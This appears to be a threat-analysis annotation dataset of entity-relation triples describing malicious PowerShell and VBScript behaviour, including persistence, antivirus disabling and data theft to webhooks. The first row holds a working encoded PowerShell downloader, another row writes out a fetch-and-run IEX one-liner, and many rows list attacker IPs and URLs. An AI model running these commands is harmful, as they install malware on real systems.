powershell.exe	PS COMMAND	Have	-EX byPAss -NoP -w 1 -EC IAAJAFsATgBlAHQALgBTAGUAcgBWAGkAYwBFAHAATwBpAG4AdABtAEEATgBBAEcAZQBSAF0AOgA6AHMARQBDAFUAUgBJAHQAWQBwAFIAbwB0AG8AQwBvAGwAIAAJAD0AIAAJAFsAbgBFAFQALgBTAEUAQwBVAHIASQBUAFkAUAByAG8AVABPAGMATwBsAFQAeQBwAEUAXQA6ADoAVABsAHMAMQAyACAACQA7ACAAIAAgAEkAUgBNACAALQBVAHIASQAgAAkAKAAdIGgAdAB0AHAAOgAvAC8AbwB6AHoAeQAdICAACQAgAAkAKwAgAAkAHSBpAG4AZwBpAGwAHSAgAAkAIAAJACsAIAAJAB0gaQB6AGMAZQAuAGMAbwBtAC8AdwBwAC0AYwBvAG4AdABlAG4AdAAvAHMAZwB1AC8AHSAgAAkAIAAJACsAIAAJAB0gMAA1ADkANgA0ADgAMgA0ADQANQA4ADYANAA1ADEAMAAdICAACQAgAAkAKwAgAAkAHSAuAGUAeABlAB0gIAAJACkAIAAJAC0AbwBVAHQARgBJAGwARQAgACAAHSAkAGUAbgB2ADoAVQBTAEUAUgBwAHIATwBGAEkAbABFAFwAdQBwAGQAYQB0AC4AZQB4AGUAHSAgAAkAOwAgAGkAbgBWAE8ASwBlAC0AaQBUAGUATQAgAB0gJABlAE4AVgA6AHUAcwBFAFIAcAByAE8ARgBJAEwARQBcAHUAcABkAGEAdAAuAGUAeABlAB0g	OBF
The script	SUB	Check	Ledger Live folder	PATH
Ctrl + C or Ctrl + X key press	EVENT	Trigger	dischat function call	ACTION
Robocopy	COMMAND	Copy	files	FILE
system information	PVI	Includes	current directory path	PVI
The script	SUB	Have	obfuscated byte array aiYLcwaq	OBF
The script	SUB	Create	Multiple files	FILE
The script	SUB	Collect	user's AppData folder	PVI
The script	SUB	Write	log.ps1	EXE
The script	SUB	Execute	System.Net.WebClient	WebClient
The script	SUB	Perform	stealthy operations	ACTION
script	SUB	Connect	remote server	URL
The script	SUB	Execute	string concatenation	ACTION
The script	SUB	Create	C:\ProgramData\tneg	PATH
The script	SUB	Retrieve	the address of VirtualAlloc	MEMORY
Decrypted command	COMMAND	Contains	**LONG_BYTE_SEQUENCE**	PARAMETER
The script	SUB	Connect	185.225.74.198:4488	IP
Run.vbs	EXE	Hosted	C:\Users\Public\Run\	PATH
The script	SUB	Allocate	Memory	MEMORY
PowerShell	PS COMMAND	Use	/C	PARAMETER
scheduled task	TASK	SetTo	run decoded string	COMMAND
The script	SUB	Use	amsi.dll	DLL
The script	SUB	Delete	.lnk files	LINK FILE
The script	SUB	Execute	Start-Sleep 6	SLEEP
copied files and the screenshot	ZIPPED FILE	Send To	Telegram bot	BOT
System.Reflection.Assembly	WAPI	Use	$RNP and $MyS	PARAMETER
The script	SUB	Have	Error Handling	ERR
proof-of-concept exploit	EXPLOIT	Use	CVE-2021-34527	VULNERABILITY
The script	SUB	Calls	function 'IGEUWHBKBY'	FUNCTION
The script	SUB	Connect	199.168.100.74	IP
aspnet_regbrowsers.exe	EXE	Locate	C:\Win\icros\framework\v4.0.30319	PATH
rundll32	EXE	Execute	'marqueesInvariance.txt'	FILE
The script	SUB	Use	CreateThread	WAPI
The script	SUB	Create	QPXCNKQPGRJWIWPIQLPDOP.bat	EXE
The script	SUB	Create	delegate zV2s3	DELEGATE
The script	SUB	Create	Run.BAT	EXE
The script	SUB	Download	'server.exe'	EXE
The script	SUB	ADD REFERENCE TO	System.Web.Extensions.dll	EXE
The script	SUB	Execute	[System.Reflection.Assembly]::Load()	Reflection.Assembly::Load WAPI
The script	SUB	Use	Hardware breakpoints	BREAKPOINT
The script	SUB	Disable	MAPS Reporting	DEFENDER
The script	SUB	Have	registry auto-run entry	AutoRun RegKey	
a long byte sequence	DATA	ConvertedTo	characters	DATA
The script	SUB	Dencrypt	Base64 encoded strings	OBF
The script	SUB	Encrypt	LONG_BYTE_SEQUENCE	OBF
email with keylogger results	PVI	Connect	srsmsb01@gmail.com	URL
The script	SUB	Have	Base64	OBF
text file	FILE	Have	MAC addresses	PVI
The script	SUB	Load	GetProcAddress	WAPI
The script	SUB	Save	a file	FILE
The script	SUB	Use	hidden window	BYPASS PARAMETER
text file	FILE	Contain	public IP	PVI
The script	SUB	Create	files and folders	PATH
The script	SUB	Execute	Get-Clipboard	WAPI
file with random name	FILE	Have	base64 encoded string	OBF
a scheduled task	TASK	Execut	start	AutoRun
The script	SUB	Modify	File content	DATA
The script	SUB	Contain	large base64-encoded string	OBF
The script	SUB	Modify	HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	AutoRun REGKEY
.NET assembly	NET ASSEMBLY	Execute	a method	FUNCTION
The script	SUB	Use	random sleep intervals	SLEEP
The script	SUB	Write	large string	DATA
text file	FILE	Contain	local IPs	PVI
The script	SUB	Delete	itself	EXE
The script	SUB	Create	WKDXIRNNHFHKNAFGOARGSL.bat	EXE
main.php	FILE	Saved	'leUafP.dat'	DATA
Report.ps1	EXE	Have	base64 encoded strings	OBF
This script	SUB	Use	DefineDynamicModule	CODE GENERATION AT RUNTIME
The script	SUB	Create	'XboxGameBar' directory	PATH
The script	SUB	Have	long byte sequence	OBF
powershell files	EXE	Saved	C:\Users\Public\Music	USER PUBLIC PATH
The script	SUB	Use	.NET reflection	NET REFLECTION WAPI
Logged data	PVI	Saved	%appdata%\Microsoft\Windows\Templates\Pages_Elements.xml	FILE
The script	SUB	Have	Base64 Encoded Strings	OBF
The script	SUB	Access	bookmarks	PVI
serv.vbs	EXE	Execute	serv.ps1	EXE
The script	SUB	Execute	long byte sequence	OBF
CreateThread	WAPI	CalledWith	dwStackSize: 0	dwStackSize PARAMETER
scheduled task	TASK	Scheduled	every 2 minutes	FREQUENCE
The script	SUB	Rename	extracted files	FILE
PowerShell remoting	PS COMMAND	Have	Split	Split PARAMETER
The script	SUB	Use	default credentials	CREDENTIAL PARAMETER
The script	SUB	Execute	IEX	IEX COMMAND
The script	SUB	Access	GitHub URLs	URL
The script	SUB	Execute	.jar file	EXE
PowerShell remoting	PS COMMAND	Have	-Join	Join PARAMETER
The script	SUB	Download	Data	FILE
The script	SUB	Have	obfuscated functions	OBF FUNCTION
The script	SUB	Create	PowerShell script (GOAGGPXWTREEEOZAACHQCE.ps1)	EXE
zip file	COMPRESSED FILE	Have	executable files	EXE
The script	SUB	Create	Scheduled Task	TASK
The script	SUB	Delete	PowerShell history	DATA
The script	SUB	Create	WD.PS1	EXE
The script	SUB	Have	-W Hidden	BYPASS PARAMETER
The script	SUB	Use	Set-MpPreference	Set-MpPreference cmdlet
Powershell	PS COMMAND	Have	-eXEC BYPASS	BYPASS PARAMETER
delegate	DELEGATE	Execute	executable memory	MEMORY
The script	SUB	Use	-error action	ERROR ACTION PARAMETER
-error action	ERROR ACTION PARAMETER	Have	silentlycontinue	silentlycontinue VALUE
PowerShell script	EXE	Hosted	C:\ProgramData	ProgramData PATH
remote script	EXE	Download	hxxp://example.com/script4.ps1	EXE
hxxp://example.com/script4.ps1	EXE	Hosted	hxxp://example.com	URL
The script	SUB	Disable	Archive Scanning	DEFENDER
Decrypted command	COMMAND	Have	sv Va	Set-Value PARAMETER
file	FILE	Saved	zip file	COMPRESSED FILE
netsh	COMMAND	Collect	clear text passwords	PVI
The script	SUB	Use	sleep commands	SLEEP
The script	SUB	Execute	web request	WebQuest COMMAND
Sursdepa.vbs	EXE	Hosted	http://46.4.198.55/10P/	URL
The script	SUB	Execute	data in allocated memory	DATA
The script	SUB	Load	.NET assembly	NET ASSEMBLY
Dropbox	EXTERNAL SERVICE	Hosted	screenshots	PVI
Send-DiscordMessage function	COMMAND	Connect	Discord webhook URL	WEBHOOK
The script	SUB	Execute	concatenated command	COMMAND
VBS file	EXE	Hosted	user's temp directory	TEMP PATH
The script	SUB	Dencrypt	Base64 string	OBF
NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE	Use	-ExecutionPolicy Bypass	BYPASS PARAMETER
The script	SUB	Use	Base64 Encoding and XOR Cipher	OBF
XX.PS1	EXE	Hosted	directory in C:\ProgramData\WD	ProgramData PATH
The script	SUB	Execute	10 seconds delay	SLEEP
The script	SUB	Execute	code in new thread	CODE
The script	SUB	Execute	20200510.rar	COMPRESSED FILE
The script	SUB	Delete	tera15.zip	COMPRESSED FILE
Start-Process	PS COMMAND	Execute	client32.exe	EXE
executable memory	MEMORY	Have	0x3000 (MEM_COMMIT | MEM_RESERVE)	MEM_COMMIT | MEM_RESERVE ATTRIBUTE
byte arrays	DATA	Hosted By	$BOOKS	PARAMETER
The script	SUB	Save	powershell files	EXE
powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-enc	ENCODED PARAMETER
powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-NoP -sta -w1	BYPASS PARAMETER
obfuscated commands	OBF	Execute	Powershell script	EXE
batch script (Smart.bat)	EXE	Execute	PowerShell script (Smart.ps1)	EXE
'XboxGameBar' directory	PATH	Hosted	ProgramData folder	ProgramData PATH
The script	SUB	Copy	shellcode	CODE
The script	SUB	Load	PresentationCore	PresentationCore ASSEMBLY
The script	SUB	Load	.NET Assembly	NET ASSEMBLY
The script	SUB	Define	InfoKey	FUNCTION
The script	SUB	Execute	Get-Diskinfo	FUNCTION
Get-Diskinfo	FUNCTION	Collect	disk information	PVI
iex	IEX COMMAND	Execute	1.exe	EXE
The script	SUB	Execute	IEx function	IEX COMMAND
tera15.zip	COMPRESSED FILE	Hosted	https://tera15.b-cdn.net	URL
The script	SUB	Write	file with random name	FILE
file with random name	FILE	Have Name	random name	RANDOM STRING
The script	SUB	Download	http://146.70.87.120:445/doc	CODE
The script	SUB	React	Ctrl + C or Ctrl + X	KEYBOARD EVENT
The script	SUB	Use	XOR decryption	FUNCTION
$txRbsuvSoU	PARAMETER	Have	x86 assembly code	CODE
screenshots	PVI	Save	%USERPROFILE%\AppData\Local\Temp\	TEMP PATH
Start-Process	COMMAND	Have	-ArgumentList	/c, del, C:\Temp\file.ps1	PARAMETER
The script	SUB	Have	$RqJJxvtujbtoiqkyAU	PARAMETER
$shell	OBF	Have	hexadecimal values	OBF PARAMETER
batch file	FILE	Scheduled	run on system startup	AutoRun
PostUpData	FUNCTION	Send	collected data	PVI
payload	OBF	DecodedTo	large string	DATA
The script	SUB	Creates	C:\ProgramData\schtasks\Microsoft.bat	EXE
The script	SUB	Write	install.vbs	EXE
The script	SUB	Obfuscate	String Replacement	OBF
GameLoop.ps1	EXE	Execute	dynamic code	COMMAND
scheduled tasks	TASK	Execute	serv.vbs	EXE
The script	SUB	Have	kernel32.dll	DLL
The script	SUB	Execute	purgeMemory.ps1	EXE
commands	COMMAND	Capture	output	DATA
received commands	COMMAND	Have	iex	COMMAND
The script	SUB	OBF	hexadecimal conversion	OBF
TvMusic.vbs	EXE	Have	Base64 encoded string	OBF
The script	SUB	Create	Cotrl.bat	EXE
an executable file	EXE	Downloaded	https://pastebin.com/raw/xxxxxxxx	URL
The script	SUB	Create	NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE
The script	SUB	Download	shutdowni.bat	EXE
TvMusic.vbs	EXE	Execute	PowerShell command	EXE
logged keystrokes	PVI	Saved	log file in user's temporary folder	PATH
The script	SUB	Download	files	FILE
The script	SUB	Use	kernel32.dll functions	WAPI
The script	SUB	OBF	Base64 strings	OBF
The script	SUB	Execute	Get-WmiObject	Get-WmiObject COMMAND
script	SUB	Use	System.Windows.Forms	WAPI
The script	SUB	Use	Reflective DLL injection	FUNCTION
powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-sta	sta PARAMETER
powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-NoP	BYPASS PARAMETER
powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-w 1	BYPASS PARAMETER
The script	SUB	Use	try-catch blocks	ACTION
registry key	REGKEY	Have	-Name 'Path'	PARAMETER
The script	SUB	Use	custom encryption function	OBF
The script	SUB	Execute	msi.dll	DLL
IEX (New-Object Net.WebClient).DownloadString	COMMAND	Have	Invoke-Expression	COMMAND
script	CLASS	Use	CreateThread	WAPI
base64-encoded string `$XyybdfuQWuefStm`	OBF	Decode	shellcode	CODE
The script	SUB	Connect	appyrinceaskeda.com	URL
The script	SUB	Wait	'start-sleep s 3'	SLEEP
PowerShell	EXE	Use	VirtualAlloc	WAPI
The script	SUB	Have	LONG_BYTE_SEQUENCE	OBF
Invoke-WebRequest	COMMAND	Have	-Hidden	BYPASS PARAMETER
The script	SUB	Use	VirtualAlloc	WAPI
The script	SUB	Execute	characters	DATA
The script	SUB	Send	output of commands	DATA
The script	SUB	Use	Out-File	Out-File COMMAND
GetProcAddress	WAPI	Hosted	kernel32.dll	DLL
The script	SUB	Remove	login data file	FILE
PowerShell	EXE	Use	Reflective DLL injection	Reflective DLL injection
IEX	IEX COMMAND	Execute	$WOGCVYBQEFKOSCKEGBGLOU	OBF
The script	SUB	Create	WebClient object	OBJECT
Pia7LCEwRGx2iWRfTz7Z5JZsXbAOejdTR7L3v4CG1eeMPKmqDcWm1aFFSiJaBpR73eLKKokpw0yr4McNoKLBYrrg2FKMU2FbVGjb	FUNCTION	Use	AES	ENCRYPTION ALGORITHM
Byte Array	DATA	CopiedInto	Memory	MEMORY
The script	SUB	Have	CDGXDSRESFUDZIFORNSEKR	FUNCTION
The script	SUB	Set	System.Net.ServicePointManager.Expect100Continue	0	ACTION
webhook URL	EXTERNAL SERVICE	Receive	current username	PVI
specific file types	FILE	Hosted	user's machine	PATH
Anti-VM/Anti-Analysis Techniques	ACTION	Include	check for analysis	ACTION
The script	SUB	Copy	files from MEMEMAN directory	FILE
The script	SUB	Have	encoded strings	OBF
New.vbs	PATH	Execute	PowerShell script	EXE
The script	SUB	Create	scheduled task GOOGLEUpdte	TASK
Set-MpPreference	COMMAND	Use	-Force	PARAMETER
The script	SUB	Execute	VBScript	EXE
VBScript	EXE	Wait	10 seconds	SLEEP
The script	SUB	Execute	Invoke method	FUNCTION
garold.zip	ZIPPED FILE	Hosted	https://apknew.ir/garold.zip	EXTERNAL URL
The script	SUB	Wait	10 seconds	SLEEP
the script	SUB	Connect	webhook URL	EXTERNAL SERVICE
http://110.42.135.208:64962/image/22.jpg	FILE	ConvertedTo	byte array	DATA
The script	SUB	EXECUTE	method 'Execute'	ACTION
The script	SUB	Copy	modified byte sequence	DATA
script	SUB	Use	SilentlyContinue	PARAMETER
The script	SUB	Have	$ueYYiuLu	OBF
BT.ps1	EXE	Generate	PowerShell script	PS COMMAND
files on the system	FILE	Include	documents, images, videos, compressed files	TYPES
The script	SUB	Download	https://cdn.discordapp.com/attachments/.../Seg.txt	URL
The script	SUB	Use	.NET assembly types	WAPI
Received data	OBF	Have	PowerShell code	CODE
The script	SUB	Use	Invoke-Expression	COMMAND
decoded byte sequence	OBF	Hosted	memory	MEMORY
The script	SUB	Execute	PowerShell script in temp folder	EXE
The script	SUB	Download	.txt file	FILE
Invoke-WebRequest	COMMAND	Have	-OutFile	PARAMETER
The script	SUB	Use	Telegram API	SERVICE
The script	SUB	Load	AddVectoredExceptionHandler	WAPI
The script	SUB	Execute	Friday.Boya	DLL
collected data	PVI	SentTo	http://hpsj.firewall-gateway.net:80/	URL
The script	SUB	Send	specific message ('---------connection lost----------')	DATA
The script	SUB	Executes	Start-Sleep -Seconds 2	COMMAND
The script	SUB	Execute	Win32Functions	NAMESPACE
'mercifulHaddock.txt'	FILE	Have	Method 'DrawThemeIcon'	WAPI
Add-Type cmdlet	COMMAND	Load	PresentationCore .NET assembly	LIBRARY
The script	SUB	Execute	AMSI Bypass	DEFENDER
The script	SUB	Executes	Obfuscated code	OBF
The script	SUB	Execute	http://20.91.206.86/64bits.php	EXE
The script	SUB	Create	libraries.vbs	EXE
"handler"  	FUNCTION	Check	EXCEPTION_SINGLE_STEP	ERROR_CODE
The script	SUB	Execute	Marshal::Copy	WAPI
'rundll32'	EXE	Load	'mercifulHaddock.txt'	FILE
YNtlGjuNxDpCPOyweziYRyjlMdBW3KahM0igyGoIt7drnUmy9TjQ9l603H92i9jm3Hpp6Sx8La5jUsyrqCmK1UI1uRMq7W0UnqYf	FUNCTION	Use	AES	ALGORITHM
The script	SUB	Have	PowerShell and VBScript	EXE
The script	SUB	Execute	other scripts	SCRIPT
The script	SUB	Save	peltgon.zip	$env:TEMP	PATH
The script	SUB	Creates	Delegate	ACTION
StartupInstall function	Function	Create	VBScript	EXE
The script	SUB	Execute	encoded commands	OBF
The script	SUB	Check	system architecture	SYS INFO
The script	SUB	Download	.jpg file	FILE
The script	SUB	Define	C# class with DllImport attributes	DLLIMPORT
Report.ps1	EXE	Hosted	AppData\Roaming folder	PATH
The script	SUB	Create	temporary directory	PATH
The script	SUB	Execute	Base64 Encoded Command	OBF
The script	SUB	Create	a file in C:\ProgramData	FILE
The script	SUB	Save	vbs files	EXE
The script	SUB	Execute	client32.exe	EXE
The script	SUB	WaitUntilFinish	thread	THREAD
sqmapi.vbs	EXE	Append	PowerShell commands	PS COMMAND
The script	SUB	Have	-Ep bypass	BYPASS PARAMETER
scheduled task (mvfp)	TASK	Execute	mvfp.vbs	EXE
The script	SUB	Execute	Robocopy	COMMAND
powershell.exe	PS COMMAND	Use	-NOP -WIND HIDDEN -eXEC BYPASS	BYPASS PARAMETER
The script	SUB	Have	infinite loop	LOOP
directories and files	FILE	Located in	C:\Windows\System32	SYSTEM PATH
Ctrl + C	KEYBOARD EVENT	Trigger	clipboard monitoring	ACTION
The script	SUB	Delete	config.json	FILE
byte array	MEMORY	Execute	new thread	THREAD
The script	SUB	DOWNLOAD	tr9.txt	FILE
The script	SUB	Use	IO.Compression.DeflateStream	COMPRESSION WAPI
The script	SUB	Write	shellcode	CODE
The script	SUB	Decompress	a base64 encoded PowerShell script	OBF EXE
The script	SUB	Execute	c.exe	EXE
The script	SUB	Collect	Operating system version	PVI
The script	SUB	Contains	obfuscated code	OBF
GameLoop.ps1	EXE	Use	reflection	WAPI
The script	SUB	Use	CreateThread	WAPI
The script	SUB	Access	user's Downloads folders	PATH
The script	SUB	Have	Chat ID	Chat ID
The script	SUB	Write	VBS file	EXE
scheduled task	TASK	Execute	PowerShell command	PS COMMAND
scheduled task	TASK	Execute	libraries.vbs	EXE
VirtualAlloc	WAPI	Create 	memory (0x3000 bytes)	MEMORY
KeyLogger function	FUNCTION	Have	while ($true)	LOOP
PowerShell	PS COMMAND	Have	-NoProfile	PARAMETER
The script	SUB	Use	PowerShell reflection	PowerShell reflection ACTION
The script	SUB	Access	user's AppData folder	PATH
memory	MEMORY	Hosted	$kgjFavhe	OBF
CreateThread	WAPI	Create	new thread	THREAD
libraries.ps1	EXE	Create	scheduled task	TASK
Get-Process	COMMAND	Check	msedge.exe	PROCESS
The script	SUB	Execute	powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | IEX	PS COMMAND
powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | IEX	PS COMMAND	Download	update.exe	EXE
PowerShell command	EXE	Connect	remote server	REMOTE HOST
scheduled task	TASK	Execute	every 1000 minutes	FREQUENCY
The script	SUB	Define	getit function	FUNCTION
The script	SUB	Execute	Get-NetIPAddress	Get-NetIPAddress WAPI
33667344.dll	EXE	Have	#1 function	FUNCTION
The script	SUB	Execute	schtasks /run /tn TaskName	schtasks /run COMMAND
XX.vbs	EXE	Execute	XX.bat	EXE
The script	SUB	Use	SHA1 Havehing	ENCRYPTION ALGORITHM
The script	SUB	Use	Reflective DLL Injection	Reflective DLL Injection
The script	SUB	Delete	.docx files	FILE
file	FILE	Hosted	user's recycle bin folder	BIN PATH
The script	SUB	Create	C:\ProgramData\TUKHAMTASSER	ProgramData PATH
The script	SUB	Decode	an encoded string	OBF
The script	SUB	Use	Marshal.GetDelegateForFunctionPointer	Marshal.GetDelegateForFunctionPointer WAPI
The script	SUB	Decode	Base64 string	OBF
client32.exe	EXE	Saved	$pzip	PATH WITH CUSTOMIZED NAME
CodeDom function	CODE	Execute	method from a compiled assembly	ASSEMBLY
The script	SUB	Execute	mea71o.apk	EXE
The script	SUB	Use	Telegram chat ID	Telegram	ACCOUNT
.docx files	FILE	Saved	user's Downloads and Desktop folders	DOWNLOAD PATH
POST request	WEB QUEST	Connect	Discord webhook	WEBHOOK
The script	SUB	Terminate	PowerShell process	PROCESS
The script	SUB	Use	-ep bypass	BYPASS PARAMETER
The script	SUB	Create	Delegate	to	execute payload	DELEGATE
The script	SUB	Download	browser.exe	EXE
sqmapi.vbs	EXE	Execute	CorSym.ps1 payload	EXE
The script	SUB	Use	-win hid	BYPASS PARAMETER
The script	SUB	Access	browsing history	PVI
The script	SUB	Modify	cookie	COOKIE
The script	SUB	Execute	string manipulation	OBF
system information	PVI	Include	operating system	PVI
operating system version	PVI	SentTo	http://51.132.148.124/brume.php	URL
Start-job -RunAs32	PS COMMAND	Create	a background job	BACKGROUND JOB
C:\Users\Owner\AppData\Local\Temp\tmpC47C.tmp	TEMP FILE	Have	stored passwords	PVI
The script	SUB	Encrypt	code and variable names	OBF
The script	SUB	Create	Screenshot.vbs	EXE
IP address	PVI	SentTo	http://51.132.148.124/brume.php	URL
installed antivirus software	PVI	SentTo	https://clk-info.ru	URL
The script	SUB	Download	New.vbs	EXE
The script	SUB	Create	C:\ProgramData\Document\py.ps1	EXE
webhook URL	WEBHOOK	Receive	clipboard data	PVI
The script	SUB	Execute	li6s.ba	EXE
The script	SUB	Execute	System Shutdown	System Shutdown COMMAND
The script	SUB	Collect	current time	TIME STAMP
$ZPWeIhCk	OBF	Hosted	x86 assembly code	ASSEMBLY
The script	SUB	Execute	Invoke-Expression	IEX COMMAND
The script	SUB	Use	Mimikatz	Mimikatz versatile tool
The script	SUB	Send	a 'No credentials found.' message	PVI
The script	SUB	Have	$XyybdfuQWuefStm	OBF
The script	SUB	Collect	IP address	PVI
The script	SUB	Disable	IOAV Protection	DEFENDER
The script	SUB	Download	https://www.escueladeteologiathetruehappiness.com/.NEW/.A.jpg or .B.jpg	FILE
new thread	THREAD	Execute	$kgjFavhe	OBF
The script	SUB	Have	infinite loop	LOOP
The script	SUB	Decode	a base64 encoded string	OBF
Pictures.bat	EXE	Runs	PowerShell script	PS COMMAND
the script	SUB	Have	Base64 Encoded Strings	OBF
registry key	REGKEY	Have	-Value '$env:TEMP\<random_string>.exe'	PARAMETER
-Value '$env:TEMP\<random_string>.exe'	PARAMETER	ReferTo	TEMP\<random_string>.exe	EXE
TEMP\<random_string>.exe	EXE	Saved	TEMP	TEMP PATH
TEMP\<random_string>.exe	EXE	Have Name	random string	RANDOM STRING
The script	SUB	Modify	registry	REGKEY
The script	SUB	Execute	p9d2.exe	EXE
The script	SUB	Collect	PC name	PVI
custom function VyXbkVlPzUKluabJiFNN	CUSTOMIZED FUNCTION	Decode	base64 encoded strings	OBF
The script	SUB	Create	Pictures.vbs	EXE
The script	SUB	Execute	infinite loop (`while (1)`)	LOOP
The script	SUB	Use	Gzip Compression	COMPRESSION ALGORITHM
zip file	COMPRESSED FILE	Have	each set of copied files	FILE
Clipboard content	PVI	SentTo	Discord webhook	WEBHOOK
The script	SUB	Have	complex byte array ($fHuDQdbdRNHLE)	OBF
System information	PVI	Include	public and local IP addresses	IP ADDRESS
text file	FILE	SentTo	Discord webhook	WEBHOOK
The script	SUB	Have	Base64 Encoding	OBF
rundll32.exe	EXE	EXPORT	DllRegisterServer	DLLRegister WAPI
The script	SUB	Execute	base64 encoded string	OBF
The script	SUB	Use	-eC switch	-eC switch PARAMETER
The script	SUB	Connect	191.232.181.180	IP ADDRESS
"handler"	FUNCTION	Check	the address of the exception	MEMORY_ADDRESS
The script	SUB	Collect	country	PVI
XX.vbs	EXE	Hosted	directory in C:\ProgramData\WD	ProgramData PATH
delegate zV2s3	DELEGATE	Call	VirtualAlloc	WAPI
CorSym.ps1	EXE	Saved	user's directory	PATH
New-Object Net.WebClient	COMMAND	Connect	https://raw.githubusercontent.com/windowsupdate1/WindowsUpdate/main/WinSecurityUpdate	URL
The script	SUB	Connect	https://github.com/Somali-Devs/Kematian-Stealer/releases/download/KematianBuild/kematian.bin	URL
The script	SUB	Use	-ExecutionPolicy Bypass	BYPASS PARAMETER
The script	SUB	Use	Get-Process	Get-ProcessCOMMAND
The script	SUB	Create	ABODCSWBRFKGTXCBPITOQG.ps1	EXE
The script	SUB	Modify	a non-public, static field	static field
The script	SUB	Send	Detected file	FILE
user's temp folder	TEMP PATH	Have	$env:computername-Capture.png	FILE
The script	SUB	Execute	GetAsyncKeyState	GetAsyncKeyState WAPI
The script	SUB	Use	IO.Compression.DeFlatStream	COMPRESSION WAPI
The script	SUB	Create	directory C:\ProgramData\WindowsHost\	ProgramData PATH
$OJTaNtrpGQ	OBF	Loaded	executable memory	MEMORY
Start-Sleep	COMMAND	Wait	3 seconds	SLEEP
SetupBypass	FUNCTION	Have	hardware breakpoints	BREAKPOINT
The script	SUB	Create	delegate	DELEGATE
6317a573893bde4aeea7e18e	FILE	SavedTo	C:\9fae5d148b89001555132c896879652fe1ca633d35271db34622248e048c78ae.apk	PATH
The script	SUB	Execute	hidden byte sequence	DATA
The script	SUB	Write	registry key	REGKEY
Loader.vbs	EXE	Hosted	AppData\Roaming folder	APPDATA PATH
libraries.vbs	EXE	Execute	libraries.ps1	EXE
The script	SUB	Execute	WD.vbs	EXE
The script	SUB	Have	-nop	BYPASS PARAMETER
The script	SUB	Create	XX.PS1	EXE
The script	SUB	Execute	contents of install.ps1	EXE
The script	SUB	Modify	Microsoft Edge's configuration files	APP CONFIGURATION FILE
The script	SUB	Upload	Dropbox	EXTERNAL SERVICE
The script	SUB	Delete	scheduled task "Data"	TASK
Collected data	DATA	SentTo	Discord webhook	EXTERNAL SERVICE
Start-Sleep	COMMAND	Have	7 seconds	SLEEP
The script	SUB	Decrypt	files in the user's application data folder	FILE
The script	SUB	Decode	DATA	DATA
The script	SUB	Connect	remote server	URL
The script	SUB	Check	Files larger than 8MB	FILE WITH CUSTOMIZED SIZE
QYZZDAOKPZUJIKAFEZWZDV.bat	EXE	Execute	malicious PowerShell script	EXE
'mercifulHaddock.txt'	FILE	Saved	'C:\users\public' directory	USER PUBLIC PATH
The script	SUB	Execute	VirtualAlloc Function	WAPI
The script	SUB	Have	obfuscation	OBF
Invoke-Expression	COMMAND	Have	-Command	C:\Temp\file.ps1	PARAMETER
-Command	C:\Temp\file.ps1	PARAMETER	ReferTo	file.ps1	EXE
C:\Temp\file.ps1	EXE	Saved	C:\Temp	TEMP PATH
The script	SUB	Have	Obfuscation	OBF
memory	MEMORY	Have	Base64 decoded payload	OBF
The script	SUB	Execute	SystemLogin.vbs	EXE
The script	SUB	Add Exclusion	update64.exe	EXE
This script	SUB	Use	InvokeWithEvasion	InvokeWithEvasion COMMAND
This script	SUB	Execute	$bbb	VAR NAME
Unknown Code	CODE	Derived From	decoded base64 string	OBF
The script	SUB	Execute	shove.ke	EXE
The script	SUB	Dencrypt	several Base64 strings	OBF
The script	SUB	Dencrypt	a long base64 string	OBF
The script	SUB	Inject	PowerShell script	PS COMMAND
The script	SUB	Wait	7 seconds	SLEEP
Reflective DLL Injection	Reflective DLL Injection	Load	decrypted strings	DATA
VBScript	FILE	Name	GRYOJAPQWXHAESUEWDUYNV.vbs	EXE
CreateThread	WAPI	Create	new thread	THREAD
The script	SUB	Decompress	garold.zip	COMPRESSED FILE
obfuscated commands	OBF	Execute	VBScript	EXE
VBScript file (Document.vbs)	EXE	Execute	batch file (Loader.bat)	EXE
PNG image file t.png	FILE	ConvertedTo	.NET assembly	NET ASSEMBLY
